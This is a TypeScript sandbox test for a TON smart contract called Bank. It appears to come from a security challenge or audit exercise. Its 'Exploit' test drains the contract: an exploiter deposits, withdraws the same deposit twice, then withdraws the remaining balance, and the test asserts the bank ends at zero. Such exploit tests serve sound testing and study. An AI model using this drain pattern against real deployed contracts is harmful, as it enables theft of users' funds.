import { Blockchain, SandboxContract, TreasuryContract } from '@ton/sandbox';
import { Cell, Dictionary, toNano } from '@ton/core';
import { Bank, value } from '../wrappers/wrappers/Bank';
import '@ton/test-utils';
import { compile } from '@ton/blueprint';

// npx blueprint test Bank.spec.ts
describe('Bank', () => {
    let code: Cell;

    beforeAll(async () => {
        code = await compile('Bank');
    });

    let blockchain: Blockchain;
    let owner: SandboxContract<TreasuryContract>;
    let exploiter: SandboxContract<TreasuryContract>;
    let bank: SandboxContract<Bank>;
    let initBalance: bigint;

    beforeEach(async () => {
        initBalance = toNano('100');
        blockchain = await Blockchain.create();

        owner = await blockchain.treasury('owner');
        exploiter = await blockchain.treasury('exploiter');

        const emptyDict = Dictionary.empty<bigint, bigint>(Dictionary.Keys.BigUint(256), value);

        bank = blockchain.openContract(Bank.createFromConfig({ dict: emptyDict }, code));

        const deployResult = await bank.sendDeploy(owner.getSender(), initBalance);

        expect(deployResult.transactions).toHaveTransaction({
            from: owner.address,
            to: bank.address,
            deploy: true,
            success: true,
        });
    });

    it('should deploy', async () => {
        const balance = await bank.getBalance();
        expect(balance <= initBalance && balance > 0n).toBe(true);
    });

    it('Exploit', async () => {
        const balanceExploiterBefore = await exploiter.getBalance();
        const balanceBankBefore = await bank.getBalance();

        await bank.sendDeposit(exploiter.getSender(), balanceBankBefore);

        const deposit = await bank.getUserBalance(exploiter.address);

        await bank.sendWithdraw(exploiter.getSender(), toNano('0.1'), deposit);
        await bank.sendWithdraw(exploiter.getSender(), toNano('0.1'), deposit);
        await bank.sendWithdraw(exploiter.getSender(), toNano('0.1'), await bank.getBalance());

        const balanceBankAfter = await bank.getBalance();
        const balanceExploiterAfter = await exploiter.getBalance();

        // console.log('Deposit', deposit);

        // console.log('balanceBankBefore', balanceBankBefore);
        // console.log('balanceBankAfter', balanceBankAfter);

        // console.log('balanceExploiterBefore', balanceExploiterBefore);
        // console.log('balanceExploiterAfter', balanceExploiterAfter);

        expect(balanceBankAfter == 0n).toBe(true);
        expect(initBalance > balanceExploiterAfter - balanceExploiterBefore).toBe(true);
    });
});
